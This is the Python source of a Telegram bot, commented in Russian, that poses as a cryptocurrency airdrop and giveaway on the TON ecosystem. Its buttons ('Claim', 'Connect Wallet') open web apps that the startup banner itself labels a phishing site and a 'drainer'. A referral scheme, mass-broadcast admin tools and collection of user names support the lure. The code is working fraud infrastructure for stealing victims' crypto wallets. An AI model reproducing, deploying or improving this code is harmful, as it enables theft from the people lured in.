import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
import sqlite3
import time
from dotenv import load_dotenv

# Загрузка переменных из файла .env
load_dotenv()

# Теперь переменные из .env доступны как переменные среды
bot_token = os.getenv('BOT_TOKEN')
drain = os.getenv('SITE')
site = os.getenv('DRAIN')
text_ru = os.getenv('TEXT_RU')
text_eng = os.getenv('TEXT_ENG')
bot_link = os.getenv('BOT_LINK')
value = os.getenv('VALUE')

# Установите свой токен бота
bot = telebot.TeleBot(bot_token)

# ID администратора
admin_id ="7483839794" 

# Создание базы данных и таблицы для хранения информации о пользователях
def create_database():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users
                      (user_id INTEGER PRIMARY KEY,
                       referral_count INTEGER DEFAULT 0,
                       is_referral INTEGER DEFAULT 0,
                       language TEXT,
                       full_name TEXT,
                       balance INTEGER DEFAULT 0,
                       referred_by INTEGER)''')
    
    # Добавление столбца "language", если он отсутствует
    cursor.execute("PRAGMA table_info(users)")
    columns = [column[1] for column in cursor.fetchall()]
    if "language" not in columns:
        cursor.execute("ALTER TABLE users ADD COLUMN language TEXT")
    
    # Добавление столбца "full_name", если он отсутствует
    if "full_name" not in columns:
        cursor.execute("ALTER TABLE users ADD COLUMN full_name TEXT")
    
    # Добавление столбца "balance", если он отсутствует
    if "balance" not in columns:
        cursor.execute("ALTER TABLE users ADD COLUMN balance INTEGER DEFAULT 1000000")
    
    # Добавление столбца "referred_by", если он отсутствует
    if "referred_by" not in columns:
        cursor.execute("ALTER TABLE users ADD COLUMN referred_by INTEGER")
    
    conn.commit()
    conn.close()

create_database()


def webapp_kb(name, url):
    kb = InlineKeyboardMarkup()
    bt = InlineKeyboardButton(text=name, web_app=WebAppInfo(url))
    kb.add(bt)
    return kb

def url_kb(name, url):
    kb = InlineKeyboardMarkup()
    bt = InlineKeyboardButton(text=name, url=url)
    kb.add(bt)
    return kb

# Обработчик команды /start
@bot.message_handler(commands=['start'])
def start_command(message):
    chat_id = message.chat.id
    referral_code = message.text.split()[1] if len(message.text.split()) > 1 else None
    
    # Создание нового соединения с базой данных для каждого запроса
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    # Проверка, существует ли пользователь в базе данных
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (chat_id,))
    user = cursor.fetchone()
    
    if user is None:
        # Если пользователь не найден, добавляем его в базу данных
        full_name = message.from_user.full_name
        username = message.from_user.username
        cursor.execute("INSERT INTO users (user_id, full_name, language) VALUES (?, ?, ?)", (chat_id, full_name, "eng"))
        conn.commit()
    
        # Отправка уведомления администратору о регистрации нового пользователя
        if username:
            bot.send_message(admin_id, f"🇷🇺 Новый пользователь зарегистрировался в боте:\nUser ID: {chat_id}\nИмя: {full_name}\nUsername: @{username}")
        else:
            bot.send_message(admin_id, f"🇺🇸 Новый пользователь зарегистрировался в боте:\nUser ID: {chat_id}\nИмя: {full_name}")
        
        # Отправка сообщения с выбором языка
        # keyboard = InlineKeyboardMarkup()
        # ru_button = InlineKeyboardButton(text="RUSSIAN 🇷🇺", callback_data="language_ru")
        # eng_button = InlineKeyboardButton(text="ENGLISH 🇺🇸", callback_data="language_eng")
        # keyboard.add(ru_button)
        # keyboard.add(eng_button)
        # bot.send_message(chat_id, "🇷🇺 Пожалуйста выберите язык: \n🇺🇸 Please select a language: ", reply_markup=keyboard)
        photo = open('first.png', 'rb')
        keyboard = InlineKeyboardMarkup()
        text = f"{text_eng}"
        airdrop_button = InlineKeyboardButton(text=f"Claim {value}", web_app=WebAppInfo(f"{drain}"))
        wallet_button = InlineKeyboardButton(text=f"Connect Wallet 👛", web_app=WebAppInfo(f"{site}"))
        profile_button = InlineKeyboardButton(text="Profile ⚜️", callback_data="profile")
        referral_button = InlineKeyboardButton(text="Referral program", callback_data="referral")
        # info_button = InlineKeyboardButton(text="More about the project ❓", callback_data="info")
        keyboard.add(airdrop_button)
        keyboard.add(wallet_button)
        keyboard.add(profile_button, referral_button)
        # keyboard.add(info_button)
        
        bot.send_photo(chat_id, photo, caption=text, reply_markup=keyboard, protect_content=True, parse_mode="HTML")
    else:
        # Если пользователь уже существует, проверяем, выбран ли язык

            # Если язык уже выбран, отправляем сообщение с фотографией и кнопками в зависимости от языка
            photo = open('first.png', 'rb')
            keyboard = InlineKeyboardMarkup()
            # if user[3] == "ru":
            #     text = f"{text_ru}"
            #     airdrop_button = InlineKeyboardButton(text=f"🎰 Вращать Рулетку TON️ 🔵", web_app=WebAppInfo(f"{drain}"))
            #     wallet_button = InlineKeyboardButton(text=f"🎁 Получить дополнительные вращения 🔥", web_app=WebAppInfo(f"{site}"))
            #     profile_button = InlineKeyboardButton(text="Профиль ⚜️", callback_data="profile")
            #     referral_button = InlineKeyboardButton(text="Реферальная программа", callback_data="referral")
            #     info_button = InlineKeyboardButton(text="Подробнее о проекте ❓", callback_data="info")
           
            text = f"{text_eng}"
            airdrop_button = InlineKeyboardButton(text=f"Claim {value}", web_app=WebAppInfo(f"{drain}"))
            wallet_button = InlineKeyboardButton(text=f"Connect Wallet 👛", web_app=WebAppInfo(f"{site}"))
            profile_button = InlineKeyboardButton(text="Profile ⚜️", callback_data="profile")
            referral_button = InlineKeyboardButton(text="Referral program", callback_data="referral")
            # info_button = InlineKeyboardButton(text="More about the project ❓", callback_data="info")
            keyboard.add(airdrop_button)
            keyboard.add(wallet_button)
            keyboard.add(profile_button, referral_button)
            # keyboard.add(info_button)
            
            bot.send_photo(chat_id, photo, caption=text, reply_markup=keyboard, protect_content=True, parse_mode="HTML")
    
    # Обработка реферального кода, если он указан
    if referral_code and referral_code != str(chat_id):
        # Проверка, существует ли пользователь-реферал в базе данных
        cursor.execute("SELECT * FROM users WHERE user_id = ?", (referral_code,))
        referral_user = cursor.fetchone()
        
        if referral_user:
            # Проверка, не был ли уже пользователь приглашен ранее
            cursor.execute("SELECT referred_by FROM users WHERE user_id = ?", (chat_id,))
            referred_by = cursor.fetchone()[0]
            if referred_by is None:
                # Если пользователь не был ранее приглашен
                referral_count = referral_user[1] + 1
                balance = referral_user[5] + 1000
                cursor.execute("UPDATE users SET referral_count = ?, balance = ? WHERE user_id = ?",
                               (referral_count, balance, referral_code))
                cursor.execute("UPDATE users SET referred_by = ? WHERE user_id = ?", (referral_code, chat_id))
                conn.commit()
                
                # Отправка уведомления пользователю, который пригласил реферала
                bot.send_message(referral_code, f"У вас новый реферал ({full_name})!\nВаш баланс увеличен на 1000 {value}.")
    
    conn.close()

# Обработчик выбора языка
@bot.callback_query_handler(func=lambda call: call.data.startswith("language_"))
def language_callback(call):
    chat_id = call.message.chat.id
    language = call.data.split("_")[1]
    
    # Обновление языка пользователя в базе данных
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET language = ? WHERE user_id = ?", (language, chat_id))
    conn.commit()
    
    # Получение баланса пользователя из базы данных
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (chat_id,))
    balance = cursor.fetchone()[0]
    
    conn.close()
    
    # Отправка сообщения с фотографией и кнопками в зависимости от выбранного языка
    photo = open('first.png', 'rb')
    keyboard = InlineKeyboardMarkup()

    text = f"{text_eng}"
    airdrop_button = InlineKeyboardButton(text=f"Claim {value}", web_app=WebAppInfo(f"{drain}"))
    wallet_button = InlineKeyboardButton(text=f"Connect Wallet 👛", web_app=WebAppInfo(f"{site}"))
    profile_button = InlineKeyboardButton(text="Profile ⚜️", callback_data="profile")
    referral_button = InlineKeyboardButton(text="Referral program", callback_data="referral")
    # info_button = InlineKeyboardButton(text="More about the project ❓", callback_data="info")
    keyboard.add(airdrop_button)
    keyboard.add(wallet_button)
    keyboard.add(profile_button, referral_button)
    # keyboard.add(info_button)
    
    bot.send_photo(chat_id, photo, caption=text, reply_markup=keyboard, protect_content=True, parse_mode="HTML")
    bot.answer_callback_query(call.id)

# Обработчик команды /admin
@bot.message_handler(commands=['admin'])
def admin_command(message):
    chat_id = message.chat.id
    
    # Проверка, является ли пользователь администратором
    if str(chat_id) == admin_id:
        # Отправка сообщения с кнопками админ-панели
        keyboard = InlineKeyboardMarkup()
        statistics_button = InlineKeyboardButton(text="1️⃣ Статистика пользователей", callback_data="admin_statistics")
        broadcast_button = InlineKeyboardButton(text="2️⃣ Рассылка сообщений", callback_data="admin_broadcast")
        broadcast_button_pro = InlineKeyboardButton(text="2️⃣ Улучшенная рассылка сообщений", callback_data="admin_broadcast_pro")
        keyboard.add(statistics_button)
        keyboard.add(broadcast_button)
        keyboard.add(broadcast_button_pro)
        
        bot.send_message(chat_id, "Админ-панель:", reply_markup=keyboard)
    else:
        bot.send_message(chat_id, "У вас нет доступа к админ-панели.")

# Обработчик нажатия на кнопку "Статистика пользователей"
@bot.callback_query_handler(func=lambda call: call.data == "admin_statistics")
def admin_statistics_callback(call):
    chat_id = call.message.chat.id
    
    # Проверка, является ли пользователь администратором
    if str(chat_id) == admin_id:
        # Получение статистики пользователей из базы данных
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM users WHERE referral_count > 0")
        referral_users = cursor.fetchone()[0]
        conn.close()
        
        # Отправка сообщения со статистикой пользователей
        text = f"Статистика пользователей:\nВсего пользователей: {total_users}\nПользователей с рефералами: {referral_users}"
        bot.send_message(chat_id, text)
    else:
        bot.answer_callback_query(call.id, "У вас нет доступа к админ-панели.")

# Обработчик нажатия на кнопку "Рассылка сообщений"
@bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast")
def admin_broadcast_callback(call):
    chat_id = call.message.chat.id
    
    # Проверка, является ли пользователь администратором
    if str(chat_id) == admin_id:
        # Отправка сообщения с запросом текста рассылки
        bot.send_message(chat_id, "Введите текст сообщения для рассылки:")
        bot.register_next_step_handler(call.message, process_broadcast_message)
    else:
        bot.answer_callback_query(call.id, "У вас нет доступа к админ-панели.")

def process_broadcast_message(message):
    chat_id = message.chat.id
    broadcast_text = message.text
    
    # Получение списка всех пользователей из базы данных
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    users = cursor.fetchall()
    conn.close()
    
    # Рассылка сообщения всем пользователям
    for user in users:
        try:
            bot.send_message(user[0], broadcast_text)
        except:
            pass
    
    bot.send_message(chat_id, "Рассылка сообщений завершена.")



@bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast_pro")
def admin_broadcast_pro_callback(call):
    bot.send_message(call.message.chat.id, "отправьте фотографию")
    bot.register_next_step_handler(call.message, photo)

def photo(message):
    global photos
    photos = message.photo
    bot.send_message(message.chat.id, "Введите текст")
    bot.register_next_step_handler(message, text)

def text(message):
    global text_m
    text_m = message.text
    bot.send_message(message.chat.id, "Введите название inline кнопки")
    bot.register_next_step_handler(message, name_btn)

def name_btn(message):
    global name
    name = message.text
    bot.send_message(message.chat.id, "Введите ссылку")
    bot.register_next_step_handler(message, link_btn)

def link_btn(message):
    global link
    link = message.text
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    bt1 = KeyboardButton("WebApp")
    bt2 = KeyboardButton("ссылка")
    kb.add(bt1, bt2)
    bot.send_message(message.chat.id, "Выбирете", reply_markup=kb)
    bot.register_next_step_handler(message, end)

def end(message):

    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    users = cursor.fetchall()
    conn.close()
    
    rm = ReplyKeyboardRemove()
    # Рассылка сообщения всем пользователям
    if message.text == "WebApp":
        for user in users:
            try:
                bot.send_photo(user[0], photo=photos[-1].file_id, caption=text_m, reply_markup=webapp_kb(name, link), parse_mode="HTML")
            except:
                pass
    else:
        for user in users:
            try:
                bot.send_photo(user[0], photo=photos[-1].file_id, caption=text_m, reply_markup=url_kb(name, link), parse_mode="HTML")
            except:
                pass
    
    bot.send_message(message.chat.id, "Рассылка сообщений завершена.", reply_markup=rm)
    


# Обработчик нажатия на кнопку "Профиль" или "Profile"
@bot.callback_query_handler(func=lambda call: call.data == "profile")
def profile_callback(call):
    chat_id = call.message.chat.id
    
    # Получение информации о пользователе из базы данных
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT referral_count, language, full_name, balance FROM users WHERE user_id = ?", (chat_id,))
    user = cursor.fetchone()
    conn.close()
    
    referral_count = user[0]
    language = user[1]
    full_name = user[2]
    balance = user[3]
    
    # Формирование текста сообщения в зависимости от языка

    text = f"👤 Your profile:\n🏿 Name: {full_name}\n👥 Referral count: {referral_count}\n💎 Balance: {balance} {value}"
    keyboard = InlineKeyboardMarkup()
    wallet_button = InlineKeyboardButton(text=f"Connect Wallet 👛", web_app=WebAppInfo(f"{site}"))
    back_button = InlineKeyboardButton(text="Back", callback_data="back")
    keyboard.add(wallet_button)
    keyboard.add(back_button)
    
    bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption=text, reply_markup=keyboard, parse_mode="HTML")

# Обработчик нажатия на кнопку "Реферальная программа" или "Referral program"
@bot.callback_query_handler(func=lambda call: call.data == "referral")
def referral_callback(call):
    chat_id = call.message.chat.id
    referral_link = f"{bot_link}?start={chat_id}"
    
    # Получение языка и баланса пользователя из базы данных
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT language, balance FROM users WHERE user_id = ?", (chat_id,))
    user = cursor.fetchone()
    language = user[0]
    balance = user[1]
    conn.close()
    
    # Формирование текста сообщения в зависимости от языка
    text = f"🔥 Your referral link:\n🔗 {referral_link}\n\n🔰 You will receive 1000 {value} for each invited referral."
    keyboard = InlineKeyboardMarkup()
    wallet_button = InlineKeyboardButton(text=f"Connect Wallet 👛", web_app=WebAppInfo(f"{site}"))
    back_button = InlineKeyboardButton(text="Back", callback_data="back")
    keyboard.add(wallet_button)
    keyboard.add(back_button)
    
    bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption=text, reply_markup=keyboard, parse_mode="HTML")

# Обработчик нажатия на кнопку "Подробнее о проекте" или "Info"
@bot.callback_query_handler(func=lambda call: call.data == "info")
def info_callback(call):
    chat_id = call.message.chat.id
    
    # Получение языка и баланса пользователя из базы данных
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT language, balance FROM users WHERE user_id = ?", (chat_id,))
    user = cursor.fetchone()
    language = user[0]
    balance = user[1]
    conn.close()
    
    # Формирование текста сообщения в зависимости от языка
    
    text = "Plunge into the world of NOT COIN SPIN, we knew right away that you deserve it. Your support has been enormous, and this giveaway is only 5% of what we want to do later.\n\nThere is a lot of new things waiting for us in our coin and the TON ecosystem.\n\n🎁Participate in the Promotion:\nThere is only one condition for participation in the promotion.\n1. Go to the web application, it is located either in the lower left corner of our bot or in the welcome message.\n2. Log in and register. \n 3. Complete simple tasks and invite friends, for which you will receive additional spins and get additional attempts! \n\n 🏆Distribution of rewards: \nDistribution of rewards occurs within 48 hours from the moment of authorization in the web application, no more than 7 calendar days! \nThe number of prizes you receive will depend on your activity, so do not forget to complete tasks and invite friends."
    keyboard = InlineKeyboardMarkup()
    back_button = InlineKeyboardButton(text="Back", callback_data="back")
    keyboard.add(back_button)
    
    bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption=text, reply_markup=keyboard)

# Обработчик нажатия на кнопку "Назад" или "Back"
@bot.callback_query_handler(func=lambda call: call.data == "back")
def back_callback(call):
    chat_id = call.message.chat.id
    
    # Получение языка и баланса пользователя из базы данных
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT language, balance FROM users WHERE user_id = ?", (chat_id,))
    user = cursor.fetchone()
    language = user[0]
    balance = user[1]
    conn.close()
    
    # Отправка сообщения с фотографией и кнопками в зависимости от языка
    photo = open('first.png', 'rb')
    keyboard = InlineKeyboardMarkup()

    text = f"{text_eng}"
    airdrop_button = InlineKeyboardButton(text=f"Claim {value}", web_app=WebAppInfo(f"{drain}"))
    wallet_button = InlineKeyboardButton(text=f"Connect Wallet 👛", web_app=WebAppInfo(f"{site}"))
    profile_button = InlineKeyboardButton(text="Profile ⚜️", callback_data="profile")
    referral_button = InlineKeyboardButton(text="Referral program", callback_data="referral")
    # info_button = InlineKeyboardButton(text="More about the project ❓", callback_data="info")
    keyboard.add(airdrop_button)
    keyboard.add(wallet_button)
    keyboard.add(profile_button, referral_button)
    # keyboard.add(info_button)
              
    bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption=text, reply_markup=keyboard, parse_mode="HTML")

# Запуск бота



print(" .----------------.")
print("| .--------------. |")
print("| |    _______   | |     ###   ## ##  #####  ##     ####   ## ##   ###    ###   ####   ####  ")
print("| |   /  ___  |  | |    ## ##  ## ##  ##     ##     ## ##  ## ##  ## ##  ## ##  ## ##  ## ## ")
print("| |  |  (__ \_|  | |    ##     ## ##  ##     ##     ## ##  ## ##  ##     ## ##  ## ##  ## ## ")
print("| |   '.___`-.   | |     ###   #####  ####   ##     ####    ###   ##     ## ##  ####   ####  ")
print("| |  |`\____) |  | |       ##  ## ##  ##     ##     ## ##   ###   ##     ## ##  ###    ##    ")
print("| |  |_______.'  | |    ## ##  ## ##  ##     ##     ## ##   ###   ## ##  ## ##  ####   ##    ")
print("| |              | |     ###   ## ##  #####  #####  ####    ###    ###    ###   ## ##  ##    ")
print("| '--------------' |")
print(" '----------------'")
print("==============================================")
print(f"Бот {bot_link} успешно запущен")
print(f"Токен бота: {bot_token}")
print(f"Сайт фишинга: {site}")
print(f"Дрейнер: {drain}")
print(f"Валюта: {value}")
print("==============================================")

while True:
    try:
        bot.polling()
    except Exception as e:
        print(f"Ошибка: {str(e)}")
        time.sleep(5)  # Задержка перед перезапуском бота